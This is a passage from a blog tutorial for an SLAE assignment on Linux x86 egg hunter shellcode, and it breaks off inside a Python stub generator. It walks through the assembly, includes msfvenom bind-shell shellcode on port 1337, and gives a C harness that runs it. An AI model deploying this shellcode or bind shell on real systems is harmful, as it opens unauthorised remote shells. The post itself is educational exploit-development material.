<!doctype html><html lang=en><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<meta content="utf-8" http-equiv=encoding>
<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
<link rel=stylesheet href=/css/grid.css type=text/css>
<link rel=stylesheet href=/css/highlight.css type=text/css>
<link rel=stylesheet href=/css/main.css type=text/css>
<meta name=apple-mobile-web-app-title content="dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly">
<meta name=apple-mobile-web-app-capable content="yes">
<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
<meta name=twitter:site content="@dubs3c">
<meta name=twitter:creator content="@dubs3c">
<meta property="og:title" content="dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly">
<meta name=twitter:title content="dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly">
<meta itemprop=name content="dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly">
<meta name=application-name content="dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly">
<meta property="og:site_name" content="dubell.io">
<meta property="og:article:published_time" content="2020-01-22T13:33:37Z">
<meta property="article:published_time" content="2020-01-22T13:33:37Z">
<base href=/www/slae-3-egghunter/>
<link rel=canonical href=/www/slae-3-egghunter/ itemprop=url>
<meta name=url content="/www/slae-3-egghunter/">
<meta name=twitter:url content="/www/slae-3-egghunter/">
<meta property="og:url" content="/www/slae-3-egghunter/">
<meta property="og:article:author" content="Dubs3c">
<meta property="article:author" content="Dubs3c">
<meta name=author content="Dubs3c">
<meta name=description content="Hunting for eggs in Linux x86 Assembly">
<meta itemprop=description content="Hunting for eggs in Linux x86 Assembly">
<meta property="og:description" content="Hunting for eggs in Linux x86 Assembly">
<meta name=twitter:description content="Hunting for eggs in Linux x86 Assembly">
<meta itemprop=image content="/img/hacker2.jpg">
<meta property="og:image" content="/img/hacker2.jpg">
<meta name=twitter:image content="/img/hacker2.jpg">
<meta name=twitter:image:src content="/img/hacker2.jpg">
<meta property="og:updated_time" content="2020-01-22T13:33:37Z">
<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
<title>dubell.io | SLAE 3: Egg hunting in Linux x86 Assembly</title>
</head><body>
<div id=particles-js></div>
<main><div class=row>
<header class="col center">
<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
</div>
</div>
<div class=row>
<div class="col center">
<nav>
<fieldset>
<legend>n4vig4ti0n</legend>
<ul>
<li><a href=/>/etc/motd</a></li>
<li><a href=/www/>/var/www</a></li>
<li><a href=/mnt/>/mnt</a></li>
<li><a href=/usr/>/usr</a></li>
</ul>
</fieldset>
</nav>
</div>
</div>
<div class=content>
<article>
<h1>SLAE 3: Egg hunting in Linux x86 Assembly</h1>
<br>
<p class=small style=color:#999>
<a href=/categories/programming>Programming</a> / January 22, 2020 â€¢ 10 min read </p>
<p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a> </p>
<br>
<p>When writing exploits, you sometimes encounter a situation where your payload is too big, you can&rsquo;t fit your payload inside the buffer. This is where &ldquo;eggs&rdquo; come in to play. The basic idea of egg hunting is to divide the payload in to two parts, part one is the hunter while part two is the hunted (the egg). The hunter is a set of instructions that searches the program&rsquo;s virtual address space for a given pattern (the egg). Once it is found, the hunter will jump to the payload following the egg.</p>
<p>The egg can sometimes be referred to as key, tag or pattern. Throughout this article, if any of those terms are used, remember that they all mean the same thing.</p>
<p>The payload is formatted as <code>&lt;egg>&lt;egg>&lt;shellcode></code>. The egg is specified twice in order to reduce collisions. If your egg is only four bytes, it could be possible that there exists an instruction that is the same as your egg. Another possibility is that you encounter the egg that you have instructed to look for. Therefore, if you specify the egg twice, you can be sure that is the real egg.</p>
<p>Before continuing this article, I will briefly try to explain a few concepts needed for understanding how egg hunting works. If you already know all about page sizes and virtual address spaces, feel free to skip to <a href=#hunting-time><strong>Hunting time</strong></a>.</p>
<p>When researching about egg hunters, I stumbled upon this paper <a href=http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf>http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</a> written by skape back in 2004. Much of this article is based on this paper.</p>
<h3 id=virtual-address-space>Virtual Address Space</h3>
<p>The purpose of an egg hunter is to search for a given key. The program that searches for this key will search virtual address space (VAS) of a given process. This process is usually the process which your payload gets injected into.</p>
<p>Before I explain what the VAS is, let&rsquo;s look at the memory layout of a linux process. Table 1 visualizes how the memory layout looks like.</p>
<table>
<thead>
<tr>
<th>Process Memory layout</th>
</tr>
</thead>
<tbody>
<tr>
<td>Kernel Space</td>
</tr>
<tr>
<td>Stack</td>
</tr>
<tr>
<td>Shared Libs + Mappings</td>
</tr>
<tr>
<td>Heap</td>
</tr>
<tr>
<td>BSS</td>
</tr>
<tr>
<td>Data</td>
</tr>
<tr>
<td>Text</td>
</tr>
</tbody>
</table>
<p style=text-align:center>
<strong>Table 1: Memory layout of a process</strong>
</p>
<p>This is how programs are structured. For example, the <code>Text</code> segment contains the assembly instructions, the <code>Data</code> segment contains initialized global and static variables, and the <code>BSS</code> segment contains uninitialized variables.</p>
<p>However, these segments can be spread out when looking at the physical memory address space, meaning the RAM. So how does your operating system know where a segment is and which segments belongs to the correct process? You most likely have multiple programs running at any given time.</p>
<p>This is where the virtual address space comes into play. When you start a process, your operating system assigns a virtual address space for your process. Not only does this isolate the process from other running processes, it also tricks the process into thinking that there only exists one space and that the process occupies it. This can be visualized in figure 1:</p>
<center>
<img src=vas.png>
</center>
<p style=text-align:center>
<strong>Figure 1: Virtual address space vs Physical address space. [1]</strong>
</p>
<p>The CPU will in turn convert a virtual address to a physical address in order to perform its operations. But wait! There&rsquo;s more :) To make things easier, the virtual and physical address space is further divided into <code>pages</code>. More on this in the next section.</p>
<h3 id=pages-of-memory>Pages of memory</h3>
<p>A page refers to a block of memory of a predefined size. In Linux, it is possible to obtain the page size by running <code>getconf PAGE_SIZE</code>. On most x86 Linux systems, the page size is 4096 bytes. Why does this matter for an egg hunter? Well, this information will greatly improve the performance of our search algorithm. Why, you may ask? When allocating memory, the OS will allocate blocks of PAGE_SIZE, which is 4096 bytes. The virtual addresses in each allocated page will be mapped to a physical address. However, there will be virtual addresses that are unmapped, these are invalid addresses. If we can easily skip invalid pages, meaning unmapped blocks of addresses, we can greatly reduce the search time. How this is done is explained in the next section.</p>
<h2 id=hunting-time>Hunting time</h2>
<p>Now it&rsquo;s time to build our egg hunter!</p>
<p>The search algorithm for our hunter will look something like this (pseudo code):</p>
<pre tabindex=0><code>egg = &quot;0x41424344&quot;*2
pages = page[]
found = &quot;&quot;
for page in pages:
    if page is readable:
        for address in page:
            if address.startswith(egg)
                 # found the egg
                 found = address
                 break
jump.to(found+8)
</code></pre><p>To summarize our algorithm:</p>
<ol>
<li>Iterate through each available page</li>
<li>If page is valid, start comparing values in addresses with egg value. If page is invalid, go to step 1</li>
<li>If egg is found, jump to [address+8] which is our shellcode</li>
<li>If no egg is found, go to step 1</li>
</ol>
<h3 id=the-assembly>The Assembly</h3>
<p>When reading skape&rsquo;s paper, the author details a few methods for validating an address without crashing the program. One of those methods is using syscalls, specifically the <code>access</code> syscall which checks a user&rsquo;s permission for a given file.</p>
<p>The syscall number for <code>access</code> can be found in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>:</p>
<pre tabindex=0><code>[...]
#define __NR_access 33
[...]
</code></pre><p>Let&rsquo;s check what the man pages say about <code>access()</code></p>
<pre tabindex=0><code>ACCESS(2)                                     Linux Programmer's Manual                                     ACCESS(2)

NAME
       access - check real user's permissions for a file

SYNOPSIS
       #include &lt;unistd.h&gt;

       int access(const char *pathname, int mode);

DESCRIPTION
       access()  checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it
       is dereferenced.

       The mode specifies the accessibility check(s) to be performed, and is either the value F_OK, or  a  mask  con
       sisting  of  the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of the file.
       R_OK, W_OK, and X_OK test whether the file exists and grants read, write,  and  execute  permissions,  respec
       tively.

       [...]
 
RETURN VALUE
       On success (all requested permissions granted), zero is returned.  On error (at least one bit  in  mode  asked
       for  a  permission  that  is denied, or some other error occurred), -1 is returned, and errno is set appropri
       ately.

ERRORS
       access() shall fail if:
       
        EACCES The requested access would be denied to the file, or search permission is denied for one of the  direc
              tories in the path prefix of pathname.  (See also path_resolution(7).)

       [...]

       access() may fail if:

        EFAULT pathname points outside your accessible address space.

       [...]
</code></pre><p>The error code we are interested in is <code>EFAULT</code> because it will indicate if the address that is being checked is valid or not, without crashing the program.</p>
<p>Let&rsquo;s start writing code! The following section zeros out registers and places our egg in ebx:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>global</span> <span class=no>_start</span>

<span class=nf>section</span> <span class=no>.text</span>

<span class=nl>_start:</span>
    <span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0xdeadbeef</span>     <span class=c>; 4 byte egg
</span><span class=c></span>    <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; Zero out ecx
</span><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>                 <span class=c>; edx, eax = eax * 0 -&gt; Zero out edx and eax
</span></code></pre></td></tr></table>
</div>
</div><p>Next part performs an OR operation between the lower-end of edx and 0xfff. This is equivalent of adding 0x1000 (PAGE_SIZE) to edx</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=nl>inc_page:</span>
    <span class=nf>or</span> <span class=nb>dx</span><span class=p>,</span> <span class=mh>0xfff</span>            <span class=c1>; PAGE_SIZE -&gt; The OR operation gets the next page</span>
</code></pre></td></tr></table>
</div>
</div><p>Next we will perform a system call to access() with the first parameter being the address we want to check and the second parameter being 0. When performing syscalls, the registers can be used as following:</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>eax</td>
<td>System call number</td>
</tr>
<tr>
<td>ebx</td>
<td>First parameter</td>
</tr>
<tr>
<td>ecx</td>
<td>Second parameter</td>
</tr>
<tr>
<td>edx</td>
<td>Third parameter</td>
</tr>
<tr>
<td>esi</td>
<td>Fourth parameter</td>
</tr>
<tr>
<td>edi</td>
<td>Fifth parameter</td>
</tr>
</tbody>
</table>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nl>check_address:</span>
    <span class=nf>inc</span> <span class=no>edx</span>                 <span class=c>; Increment edx
</span><span class=c></span>    <span class=no>pushad</span>                  <span class=c>; Preserve current registers by pushing them to the stack
</span><span class=c></span>    <span class=no>lea</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>4</span><span class=p>]</span>        <span class=c>; Load the effective address at edx + 4 bytes
</span><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x21</span>            <span class=c>; __NR_access 33
</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Interrupt the kernel to run our syscall
</span></code></pre></td></tr></table>
</div>
</div><p>The last part involves checking if we have found our egg or not. If don&rsquo;t find we restart from the beginning until we find it.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm>    <span class=nf>cmp</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xf2</span>            <span class=c>; Check if we go error when reading addr in page
</span><span class=c></span>    <span class=no>popad</span>                   <span class=c>; restore the original registers
</span><span class=c></span>    <span class=no>jz</span> <span class=no>inc_page</span>             <span class=c>; If we got error, increment page and restart from the beginning
</span><span class=c></span>
    <span class=nf>cmp</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span> <span class=no>ebx</span>          <span class=c>; Does the value stored at $edx correspond to our egg?
</span><span class=c></span>    <span class=no>jnz</span> <span class=no>check_address</span>       <span class=c>; If not, jump back to check_address and check the next address
</span><span class=c></span>
    <span class=nf>cmp</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>0x4</span><span class=p>],</span> <span class=no>ebx</span>      <span class=c>; Does the next 4 byte value also equal our egg? If so, we have found it!
</span><span class=c></span>    <span class=no>jnz</span> <span class=no>check_address</span>       <span class=c>; If not, jump back to check_address and check the next address
</span><span class=c></span>
    <span class=nf>lea</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>0x8</span><span class=p>]</span>      <span class=c>; Load the correct address containing the start of our shellcode
</span><span class=c></span>    <span class=no>jmp</span> <span class=no>ebx</span>                 <span class=c>; jump to shellcode!
</span></code></pre></td></tr></table>
</div>
</div><p>I modified the code to load the effective address at <code>[edx+8]</code> and jump to that once the egg has been found. This is because my egg is not executable, therefore I must jump directly to the shellcode. If a different egg was chosen that is executable, e.g. <code>0x50905090</code>, then this extra step could be skipped.</p>
<h3 id=final-code>Final code</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>global</span> <span class=no>_start</span>

<span class=nf>section</span> <span class=no>.text</span>

<span class=nl>_start:</span>
    <span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0xdeadbeef</span>     <span class=c>; 4 byte egg
</span><span class=c></span>    <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; Zero out ecx
</span><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>                 <span class=c>; edx, eax = eax * 0 -&gt; Zero out edx and eax
</span><span class=c></span>
<span class=nl>inc_page:</span>
    <span class=nf>or</span> <span class=no>dx</span><span class=p>,</span> <span class=mi>0xfff</span>            <span class=c>; PAGE_SIZE -&gt; The OR operation gets the next page
</span><span class=c></span>
<span class=nl>check_address:</span>
    <span class=nf>inc</span> <span class=no>edx</span>                 <span class=c>; Increment edx
</span><span class=c></span>    <span class=no>pushad</span>                  <span class=c>; Preserve current registers by pushing them to the stack
</span><span class=c></span>    <span class=no>lea</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>4</span><span class=p>]</span>        <span class=c>; Load the effective address at edx + 4 bytes
</span><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x21</span>            <span class=c>; __NR_access 33
</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; Interrupt the kernel to run our syscall
</span><span class=c></span>
    <span class=nf>cmp</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xf2</span>            <span class=c>; Check if we go error when reading addr in page
</span><span class=c></span>    <span class=no>popad</span>                   <span class=c>; restore the original registers
</span><span class=c></span>    <span class=no>jz</span> <span class=no>inc_page</span>             <span class=c>; If we got error, increment page and restart from the beginning
</span><span class=c></span>
    <span class=nf>cmp</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span> <span class=no>ebx</span>          <span class=c>; Does the value stored at $edx correspond to our egg?
</span><span class=c></span>    <span class=no>jnz</span> <span class=no>check_address</span>       <span class=c>; If not, jump back to check_address and check the next address
</span><span class=c></span>
    <span class=nf>cmp</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>0x4</span><span class=p>],</span> <span class=no>ebx</span>      <span class=c>; Does the next 4 byte value also equal our egg? If so, we have found it!
</span><span class=c></span>    <span class=no>jnz</span> <span class=no>check_address</span>       <span class=c>; If not, jump back to check_address and check the next address
</span><span class=c></span>
    <span class=nf>lea</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=mi>0x8</span><span class=p>]</span>      <span class=c>; Load the correct address containing the start of our shellcode
</span><span class=c></span>    <span class=no>jmp</span> <span class=no>ebx</span>                 <span class=c>; jump to shellcode!
</span></code></pre></td></tr></table>
</div>
</div><h2 id=testing-our-egg-hunter>Testing our egg hunter!</h2>
<p>In order to test our egg hunter, we can quickly generate some shellcode with <code>msfvenom</code>:</p>
<pre tabindex=0><code>dubs3c@slae:~$ msfvenom -p linux/x86/shell_bind_tcp lport=1337 -f c -a x86 --platform=linux
No encoder specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] =
&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;
&quot;\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a&quot;
&quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&quot;
&quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&quot;
&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&quot;
&quot;\x0b\xcd\x80&quot;;
</code></pre><p>Now we can create a program that will execute our egg hunter and hopefully find our shellcode generated by msfvenom. I have specified the egg twice as prefix to the shellcode <code>\xef\xbe\xad\xde\xef\xbe\xad\xde</code>.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span><span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>hunter</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xbb\xef\xbe\xad\xde\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\x8d\x5a\x08\xff\xe3</span><span class=s>&#34;</span><span class=p>;</span>

<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> \
        <span class=s>&#34;</span><span class=se>\xef\xbe\xad\xde\xef\xbe\xad\xde</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x5b\x5e\x52\x68\x02\x00\x05\x39\x6a\x10\x51\x50\x89\xe1\x6a</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0</span><span class=s>&#34;</span>
        <span class=s>&#34;</span><span class=se>\x0b\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>

<span class=n>main</span><span class=p>()</span>
<span class=p>{</span>

    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Egg hunter length: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>hunter</span><span class=p>));</span>
    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>));</span>
    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>hunter</span><span class=p>;</span>
    <span class=n>ret</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>Compiling with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code> and running <code>./shellcode</code> yields the following result:</p>
<center>
<img src=egghunter-result.png alt=result>
</center>
<p>Yay it works!</p>
<h2 id=making-the-process-configurable>Making the process configurable</h2>
<p>I created a simple python script that would generate the stub which can then be compiled and executed.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>

<span class=kn>import</span> <span class=nn>sys</span>


<span class=k>def</span> <span class=nf>generate_stub</span><span class=p>(</span><span class=n>egg</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>):</span>
    <span class=n>stub</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&#34;&#34;
</span><span class=s2>#include&lt;stdio.h&gt;
</span><span class=s2>#include&lt;string.h&gt;
</span><span class=s2>
</span><span class=s2>unsigned char hunter[] = &#34;\xbb</span><span class=si>{egg}</span><span class=s2>\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\x8d\x5a\x08\xff\xe3&#34;;
</span><span class=s2>
</span><span class=s2>unsigned char shellcode[] = &#34;</span><span class=si>{egg}{egg}{shellcode}</span><span class=s2>&#34;;
</span><span class=s2>
</span><span class=s2>main()
</span><span class=s2>{
</span><span class=s2>
</span><span class=s2>    printf(&#34;Egg hunter length: </span><span class=si>%d</span><span class=s2>\n&#34;, strlen(hunter));
</span><span class=s2>    printf(&#34;Shellcode length:  </span><span class=si>%d</span><span class=s2>\n&#34;, strlen(shellcode));
</span><span class=s2>
</span><span class=s2>    int (*ret)() = (int(*)())hunter;
</span><span class=s2>
</span><span class=s2>    ret();
</span><span class=s2>
</span><span class=s2>}
</span><span class=s2>&#34;&#34;&#34;</span>
    <span class=n>stub</span> <span class=o>=</span> <span class=n>stub</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{egg}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>egg</span><span class=p>)</span>
    <span class=n>stub</span> <span class=o>=</span> <span class=n>stub</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{shellcode}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>stub</span>


<span class=k>def</span> <span class=nf>write_file</span><span class=p>(</span><span class=n>stub</span><span class=p>):</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;stub.c&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>stub</span><span class=p>)</span>
        <span class=k>return</span> <span class=kc>True</span>
    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>err</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Could not create file stub.c. Error: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>err</span><span class=p>))</span>
        <span class=k>return</span> <span class=kc>False</span>


<span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>egg</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>):</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;</span><span class=si>{egg}{egg}{shellcode}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>egg</span><span class=o>=</span><span class=n>egg</span><span class=p>,</span> <span class=n>shellcode</span><span class=o>=</span><span class=n>shellcode</span><span class=p>)</span>

    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Generating stub...&#34;</span><span class=p>)</span>
    <span class=n>stub</span> <span class=o>=</span> <span class=n>generate_stub</span><span class=p>(</span><span class=n>egg</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>)</span>
    <span class=n>err</span> <span class=o>=</span> <span class=n>write_file</span><span class=p>(</span><span class=n>stub</span><span class=p>)</span>
    <span class=k>if</span> <span class=ow>not</span> <span class=n>err</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Exiting...&#34;</span><span class=p>)</span>
        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Done&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Stub located at stub.c&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Full payload: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
